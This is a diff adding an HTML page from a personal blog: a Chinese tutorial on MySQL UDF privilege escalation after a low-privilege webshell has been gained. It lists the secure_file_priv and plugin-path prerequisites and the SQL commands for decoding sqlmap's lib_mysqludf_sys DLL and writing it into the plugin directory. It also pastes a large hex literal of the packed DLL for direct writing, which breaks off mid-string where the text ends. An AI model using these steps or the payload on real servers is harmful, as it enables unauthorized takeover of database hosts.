@@ -1,0 +1,1308 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="UDF提权, xmhhmx的blog">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>UDF提权 | xmhhmx的blog</title>
+    <link rel="icon" type="image/png" href="/medias/%E5%A4%A9%E7%A7%A4%E5%BA%A7.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/%E5%A4%A9%E7%A7%A4%E5%BA%A7.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">xmhhmx的blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于我</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/%E5%A4%A9%E7%A7%A4%E5%BA%A7.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">xmhhmx的blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于我
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">UDF提权</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2025-07-31
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2025-08-01
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    1.4k
+                </div>
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/121193134">https://blog.csdn.net/qq_44159028/article/details/121193134</a></p>
+<h2 id="UDF介绍"><a href="#UDF介绍" class="headerlink" title="UDF介绍"></a>UDF介绍</h2><p>UDF：User Defined Function（用户自定义函数），是MySQL的一个扩展接口，用户可以通过自定义函数实现在MySQL中创建一些MySQL无法直接实现的功能，其添加的新函数可以在SQL语句中调用并执行。</p>
+<ul>
+<li>Windows中提权文件为udf.dll，Linux中为udf.so</li>
+</ul>
+<blockquote>
+<p>动态链接库(DynamicLinkLibrary，缩写为DLL)是一个可以被其它应用程序共享的程序模块，其中封装了一些可以被共享的例程和资源。使用DLL的主要目的就是为了共享代码，DLL的代码可以被所有的Windows应用程序共享。</p>
+</blockquote>
+<h2 id="何时进行MySQL提权"><a href="#何时进行MySQL提权" class="headerlink" title="何时进行MySQL提权"></a>何时进行MySQL提权</h2><p>有时拿下了服务器的webshell，但是webshell的权限较低，有些操作无法执行，这是刚好拿到了MySQL的权限，就可以利用UDF来进行提权，进而拿到服务器操作系统的权限</p>
+<ul>
+<li>MySQL提权获得的权限大小取决于当前服务器以什么权限账户登录</li>
+</ul>
+<h2 id="提权的先决条件"><a href="#提权的先决条件" class="headerlink" title="提权的先决条件"></a>提权的先决条件</h2><ol>
+<li>获取了MySQL的控制权限：知道MySQL的用户密码并且可以远程登录</li>
+<li>MySQL具有写入权限，即secure_file_priv的值为空</li>
+</ol>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th align="center">值</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">secure_file_priv = 空</td>
+<td align="center">无任何限制，udf.dll可以写入任意位置</td>
+</tr>
+<tr>
+<td align="center">secure_file_priv = /tmp/</td>
+<td align="center">限制只能写入/tmp/目录</td>
+</tr>
+<tr>
+<td align="center">secure_file_priv = NULL</td>
+<td align="center">不允许写入</td>
+</tr>
+</tbody></table>
+<p>secure_file_priv是用来限制load dumpfile、into outfile、load_file函数在哪个目录下拥有上传和读取文件的权限。</p>
+<ul>
+<li>注意为NULL和为空的区别</li>
+</ul>
+</blockquote>
+<h2 id="版本特性"><a href="#版本特性" class="headerlink" title="版本特性"></a>版本特性</h2><p>udf提权操作中的一个步骤是将我们的udf文件上传到mysql的检索目录中，Windows系统下mysql各版本的检索目录有所不同</p>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th>路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL &lt; 5.0</td>
+<td>导出路径随意</td>
+</tr>
+<tr>
+<td>5.0 &lt; MySQL &lt; 5.1</td>
+<td>Windows Server 2000导出路径： C:\Winnt\system32<br>其他Windows系统导出路径均为：C:\Windows\udf.dll或C:\Windows\system32\udf.dll</td>
+</tr>
+<tr>
+<td>MySQL &gt; 5.1</td>
+<td>必须放置在MySQL的安装目录中的lib\plugin，没有该目录需自行创建</td>
+</tr>
+</tbody></table>
+<h2 id="UDF文件位置"><a href="#UDF文件位置" class="headerlink" title="UDF文件位置"></a>UDF文件位置</h2><h3 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h3><p><code>sqlmap\data\udf\mysql</code>中，有Windows以及Linux的版本，根据不同操作系统进行选择，然后再根据是32位还是64位系统进行选择</p>
+<h2 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h2><ol>
+<li>查看MySQL是否具有写入权限，当secure_file_priv 返回为空时，证明具有写入权限</li>
+</ol>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">'%secure%'</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20122844.png" style="zoom:67%;">
+
+<p>如果secure_file_priv的值不为空，我们可以在mysql/my.ini中查看是否有secure_file_priv 的参数，如果没有的话我们就添加 secure_file_priv = ‘ ‘ ，然后重启apache服务即可生效。</p>
+<ol start="2">
+<li>上传UDF 的动态链接库文件（udf.dll / udf.so）</li>
+</ol>
+<p>先获取当前数据库及操作系统的架构情况</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@version_compile_os</span>, @<span class="variable">@version_compile_machine</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20123038.png" style="zoom:67%;">
+
+<p>这里我的MySQL是64位，操作系统是x86_64，那么这里需要上传64位的dll文件</p>
+<p>SQLMAP中自带的动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。这里如果后缀名为.so_或dll_的话，就需要解码，如果后缀名为.so或.dll的话就不需要解码即可直接使用。这里sqlmap也自带了解码的py脚本，在/extra/cloak目录下，使用cloak.py解密即可</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cloak.py -d -i lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll</span><br></pre></td></tr></tbody></table></figure>
+
+<p>解密后得到lib_mysqludf_sys_32.dll文件</p>
+<p>此时，我这里mysql版本大于5.1，所以dll文件需要放在/lib/plugin下，但是plugin文件夹默认不存在，需要创建。如果发现没有lib路径的存在，需要使用NTFS ADS进行创建（在获取到shell的情况下，如果权限够，也可以使用webshell管理工具创建）通过以下命令查看插件的存放目录，同时可以确认安装的MySQL版本。此处，虽然显示了lib目录，但是其实并未创建。</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">'plugin%'</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20133608.png" style="zoom:67%;">
+
+<p>写入文件可以有三种方法，如下：</p>
+<p>方法一：将文件直接写入（该方法有时候写入步骤只会写入一部分的内容，导致接下来的步骤都失败，此处我写入成功，但是无法创建自定义函数，所以建议使用方法二）</p>
+<p>通过如下命令将解码后的dll文件写入到plugin的udf.dll文件中</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> hex(load_file(<span class="string">'B:\\1Cybersecurity tools\\SQLmap\\extra\\cloak\\lib_mysqludf_sys.dll'</span>)) <span class="keyword">into</span> dumpfile <span class="string">'B:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll'</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>ps：这里windows下目录结构要进行转义双写</li>
+</ul>
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20135729.png" style="zoom:67%;">
+
+<p>方法二：直接写入十六进制数据</p>
+<p>各操作系统以及位数的16进制UDF动态链接库文件数据详见：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">MySQL UDF 提权十六进制查询 | 国光</a></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000e80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000677cbfda231dd189231dd189231dd18904dbbf89211dd18904dbbc892a1dd18904dbaa89261dd189231dd0890f1dd18904dbac89211dd18904dba089221dd18904dbab89221dd18904dba989221dd18952696368231dd189000000000000000000000000000000005045000064860300a727a15a0000000000000000f00022200b020800002000000010000000800000109f000000900000000000100000000000100000000200000400000000000000050002000000000000c000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098b2000008020000b0b10000e800000000b00000b00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000e0555058310000000000200000009000000012000000040000000000000000000000000000400000e02e727372630000000010000000b000000006000000160000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d240209e1e421439d3bdfb7de7400000f0f0000002a0000490000d41de9feff833a007450488b05a421000049890009a24008cd4973d20a9f109c1899cd9f34272096280fb70593666d83fdb7410b30b001c332c0c3cc00c215cc92c9ba810034716a6febcc16e46c096a471853fdbf1fa4631c0fb605591688401e41c7011e00ffed6dd62b8b63bf01750f3f42088338007506c64b26ebdc01017b4e2d632b05b9e4b228ce25227ed20cd26f1f28152ab001c3f66d7bc2bf83ec38344a43895c243084b7fff6dbd90b09ff15c71f2b4885c04c8bd87512104c24df6eaeb9608707202dc4388e897c242873edcdfd33c048c7c1ff0033fbf2ae1c120976d9b75b1af7d122e901890b2dcc00be6feb166f28e3026e404848deda7fdb29f938d87459488d0d40ee4e0e813832983de4c1eb81403281480a9ee4435e4f81503281543281563261f37d4fb0018c48804028c34c49467607744e61deed584917e49260680a703c6527cd18782056c740045cf8bf33b64342188b48048b008d4c010239bd1e77d27d8bd947107543706d8045ec1be936130309884370900a00b69dee10c8980a18bc0cb3c6b00e07103fbcb37ddb0f49a585c974066f5d17b7086d21cf93cf047424ada3b9772d7110448b6949e2fa02c2eddfba52e2ce0212498d5c3001e83f0ffce85cd7fddd5febcb418b03c60430d2470d5734b70c58d7e22d0822d34313167bb75bce2618007ca01cff56677c84842f7198f4cf16c64373870d087c8c03d6e4240f79561e541e511e7292939c4e1e4b1e481e63c2425e3e1e1fcf2784ee87c71f1da0981f4c89c68685ee44241824580f6c59897486bb86db76381764bdb900d34c18284cb0db7e302d4d8bf146e8e7b901ee9b6dc1ec04e00dda4533ed4488670beef69b4ff04c39290f8413050673f215fdcfb8b9169125ac1c088be8747b418d5508e1c9b6b13ac0e6cc177c7466a04b6640fa50669047fc3f42858e1b0b9529328d7936ce6f7d61c16c304375cd8cc74803c8f56636b724d470143e51c5ba08e1d9b68d39cc1ceb13225975ad886cdbb6f050eb258bc77004cd1930ddfe9cdb803e30e2154874229245ffb176d8827811fef5887edd4d174ebe5a0eebc18424805ec606e71ada0001380c4c38f12a10f8386c04c6f0a0581a87e792317fd3dc5cd8d6d09d58747a28f2023f73b773df3e448d48406e41b80010b3748bd1f10df7c7ed33c9ab441a5356104cefa2dbe6b66c02c8d8154e1b8d54b94c350aede98d054a75890ba3b16e3b2dbc3133d2c7d0208925183bdf19b7b3bad2c80df2199d30ac581e29eb081433c0922fb384f13be0064ceb0033c029001bb0dfb65538ec024510ff10c9196600fb6f7f6c900390483b0d89293f751148c1c11066f7dddd6fdfb87502f3dac1c910e9150aeccc405361203b8b7d1b5801a05fdcd25b0bfbeef7f685dbc905112fd005020675098d430185bb76efb6205b42c703d59b0d3c48b406634136670b1c5805b12006615bd85bc3cf55d27f6cc7c7c376fc608468e140dcfbf1c2c63831e83be141bdd20f8503ee46bb7408075ee428073c0f8e0d8de6b61b6e2bc58ed3105fdcfd3e76fb0fb12d602e0a741ef290b9e803c91d19bfdb36931d4275e841320783f802740fb9ef6dc3b31fb70eca0208e2ed0d2f2e338e740fd2111912f874491412fc18dadc0b1fd958f847df72165f1803b6bb2d701e4ad0c9eb081573ed12ecf6bedbcf2774192d06429bd72d0698fbfb66d833db891db80e871db906716fc7feb59806e5413bd5dde26541042530bb7dbbbd002c0978081e8bf3f048b93d883072b0b7920a63c7741ad64618d7d29b2f1c6b75e3eb037bf5a79a5ed6390c950cdaeb3fea1f9f7db7f08e8f080644892d312d1bc485c0678fed62771a15e5de0dd6181abe7fddbbeec7050725024585f67507b404bb833d14ddc96e73068b212a0b2d5c6f11dedd264fe3029cf12c66012d3a273e9e9ebe10c58f38d240e468ec98717a60dce91748c3b14d22190f6c20483a5adbf308505851f0dd05bbee77df3d041f208915d12695d275133915d709ed7f38c3750b5a17c61e83fa017405040add6be00275338931d39d08a3b71b0d34c84e20c574134ac68b07863db9d7a64bfc1616e0c9016b3c1a0edc83ffb092ebda1535ab311bc11bdb5b0bd80c430c1dc817084d7bf787755c0b1841ffd385ff88ff03753970f79d75094a08aeeb8d1ca51e36ec648b171028adeb06d8192ecc298adc25f3008bc3659e8793708b218b8bf8b59d9e2a4055bf15eaa3894d7afab61b01018b080724b0d67d5d902dd9c2302f5e7d0ab1485825ff4ddb960c1e92387d2eda02f101d7136fa3f875056c0cfcfa7d918844a4fd258b036983eb2f9e8e090cefc6f852a1899e2681ec880068cd760dbffe73153f156705b8c648f25845b7390cb8283d1f2c586170c339def61624eb754148b73dc6364238004044230430090e662fcf40280578254703055c73874c1c51494e7d4bb1077f4bf0eb222b8093447bdd837d738d0e83c00812d13e8d67db7b642a059b240d20902f9c5ba25b701c2a7214097bc009cc3e1e666c926724766e833572dbff0b70dc7a142f482c38b0bb2493827b8ef083d2396a14019b15650ccb36dc9255b624c80a271b83d76c1854ba6a234e336b1784f781c4aca041592947a626231c0fd8cf53188186d9ef0d68295a4a148a8ef8ececcdd64427cb1366eb75b908674b32d21dea902d3a1c1128106464200a8b83af334463971bcb36e418c323db83a238243d05f62809993959b611402bdc678c90c136de1bc3017f37320296247f15f4f6120d6276d81bc00383e8013c2075643f289c8d3d53041a787f4b8d1d4c068d13a08491790ec372b3326129a9ef4f137f2344720cc96681394d5a75fcb7c3ff174863513c813c0a5045e1137c0a180b020f94c063e343029f4c63413cfec9b4ebed8d7ed24c03c1413c4014450458064525ffc25f6a4ab10018741f8b510b3bd2720a8b4108ed6ff8db03c209d072104183c113c128453bcb72e16fc796b05d1cc1c3cf4cc1267af7446992e1da85dcbd1f4c2bc15feafb5abed0140ccd0f3a24c1e81f600d2cfef7d083e001eb02584fd644ab360196ebcac0b66c3008eec18b01a7ffaa128d3cc77627252205cc11ce78dca606cb113f75463da70ff0dd4603241b471eb801000000277c29847f3fe520000081bff83c3dfc32a2df2d992b7dc7f83074149d6fa3d00e7f5dc6268b2dc285586b212430bc6286b6489934e10ab9b4c856e04671d849460bb50e731c0eb110d9be10a8d813fe6a4cb84c33dbceb8ff00856037ba1623e9b8338975dde016b1df744d44d89c1d39b705dbdd8449f7d3093720d2fbdc4b4646463605dee0e2e4b24746465e505a11000055c9a8aa298064547fb017d8069017303007d04e6f206172ffffdffe67756d656e7473096c6c6f77656420287564663a206c69625f6d79730bf6b7dd716c0d5f73085f696e666f29411c80edff232076657273696f6e20302e0134ededee17a178706563744b657861076c79201a6dbb7dfb652073747243672074791b2070766175d8299b6d21724f2f7477996d60010b1f438ef6f603fb72206e616d4c436f756c246e6f74cce8b66d3b63611320186d27796372ff850740310106023532023001240d0024f6ffb7ffd407001fc408001a740b15640c0010540b000b340a0004822776bbdcfe1918090018c40f13740e640b093427b763d4ed046217d41e5e3f1903241aedbacf2c5007390f2a07801abbdc6e8367165b16743711640c340b7bd85b770442130c390c01118350118b9b6df705530133871c03e4001d5d90ed60430e057b743f09baeeb0d80401072f67079403a06077dbc10701462f462b1074092f0db6d94e3416033b01000715bb0bb6bd971574062f64f7df21000884ddb640ae043439741f00bf20eeecedb6140629034c341f0ba903e1c2debe240f05c305340a13234bd36d9b6e23431e14c45f0f470a75b713760554094b01098909a2071e7de572bb1f1e742f12640d34870142b71582bb2e1311cf0c03ca96dd0e01380f387427005124a3aafec10246ddcd5d20d266d4ff555516c900178fa02a1b003011764bd56c039180bfa007e0126dd79ddd03703407f803680b0013026a76fbba8603540b14021814170b581590fb2f07d9eeecf60a150310340727030034075bd5b9dd7003e0336f0724b3cc755dd7750b30074203ac0b9007f5b61b94db03c03233920c1903c8ba05a0eb0b10074f8be80b508375afeb077303444707990ba0b65dd77507e503280bf0073a1c033c0038b7eb0b5007f71ca70b77b63bdb8b191d2f2007381dcb40071dac7b5d83036c8307d30b601e9ded5eb3039b7c5f07c11e3be0d0ae3bdb07031f3b1007d6039c33ca1255954a005525a3aaa8aa9251645455c9d09ba0887c0402c4ff16360157616974466f7253ac7f2b40fc6c654f626abd14566972747561f63703c46c419a0d536574456e76126dbf01e26f6ee45661726961622b41eb2e40bc18437265b8546806640df65bf76d47264375727222502a636573734914e283cd1226135469636bb6fd6e03026e6b517565727950036684dedbb1f66d616e3716657218446973676fdbdbcf374c6962727879436192731a52746c633bb76d0970a2722d2c7874124cbdb5adfd6f6f6b7570463ec26916b2747279dfb5078b17cd556e77e47e4973446562736f6bed75676763a7a56583e11dfeb6b77268616e64457883704046696ca56c85c58719f19319dab61254176d65151153daf6586b39352b537973176dfa81e87517454173426509a3dbfe434388a0895f616d73675fcc6990b3850bbf5f5f435f73708b6966285f7e267cdb766f5f64116f035f706f6922430b76db2663da5f64ce280009626b31142d325f7a13c417840b5f7b50705b6c735f330a6c212205db5accd82a58096e73ed6bc982130fd76d643ed6bad6de756c343f15416d170cdea3e0020ab52689a3b565c933a196063bc16db15b0772652508661115080d5ba1739c29709f73149bb5adb93932ae6e074d0f85d7badbc56f736a663a70105e3b84ed70705831747b6d343fdf15f4c700f08c21180800e264860600a76efb0fe327a15ae6f00022200b020808120cb07744b314132e0010000005cf1e6c9b02020433050002088000c302f663146d160100022e063af76c650f0a50394330908de8db88223c1460e2d880d4bd0118020183703aacbb024b00303a011e4644a42b2e1054822d3bd810901200dc00b3dbc63b6f602e7264a76108550b53597761dd000c03162740022e26291b61f600d805100c22273616ececc02e702850eb27244fd820fc007273726300136027b3c7013226650942fca664b0702728421b4036c08d6d05ca7212d3060000000000009000ff0048894c240848895424104c8944241880fa010f854502000053565755488d35cdf0ffff488dbe0080ffff5731db31c94883cdffe85000000001db7402f3c38b1e4883eefc11db8a16f3c3488d042f83f9058a1076214883fdfc771b83e9048b104883c00483e9048917488d7f0473ef83c1048a10741048ffc0881783e9018a10488d7f0175f0f3c3fc415beb0848ffc6881748ffc78a1601db750a8b1e4883eefc11db8a1672e68d410141ffd311c001db750a8b1e4883eefc11db8a1673eb83e8037217c1e0080fb6d209d048ffc683f0ff0f843a0000004863e88d410141ffd311c941ffd311c9751889c183c00241ffd311c901db75088b1e4883eefc11db73ed4881fd00f3ffff11c1e83affffffeb835e4889f7b900120000b2004889fbeb2c8a074883c7013c80720a3c8f7706807ffe0f74062ce83c0177233817751f8b072500ffffff0fc829f801d8ab4883e9048a074883c70148ffc975d9eb0548ffc975be4883ec28488dbe007000008b0709c0744f8b5f04488d8c30b0a100004801f34883c708ff96eca1000048958a0748ffc708c074d74889f94889faffc8f2ae4889e9ff96f4a100004809c074094889034883c308ebd64883c4285d5f5e5b31c0c34883c4284883c704488d5efc31c08a0748ffc709c074233cef77114801c3488b03480fc84801f0488903ebe0240fc1e010668b074883c702ebe1488baefca10000488dbe00f0ffffbb00100000504989e141b8040000004889da4889f94883ec20ffd5488d871702000080207f8060287f4c8d4c24204d8b014889da4889f9ffd54883c4285d5f5e5b488d4424806a004839c475f94883ec804c8b442418488b542410488b4c2408e91f79ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005cb0000054010000e404000000000000586000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564338302e435254222076657273696f6e3d22382e302e35303630382e30222070726f636573736f724172636869746563747572653d22616d64363422207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e0000000000000000000000002cb20000ecb1000000000000000000000000000039b200001cb20000000000000000000000000000000000000000000044b200000000000052b200000000000062b200000000000072b200000000000080b200000000000000000000000000008eb200000000000000000000000000004b45524e454c33322e444c4c004d5356435238302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c46726565000000667265650000000000000000a727a15a0000000074b30000010000001200000012000000c0b2000008b3000050b300007010000060100000001000008015000060100000701500002014000060100000901300000014000060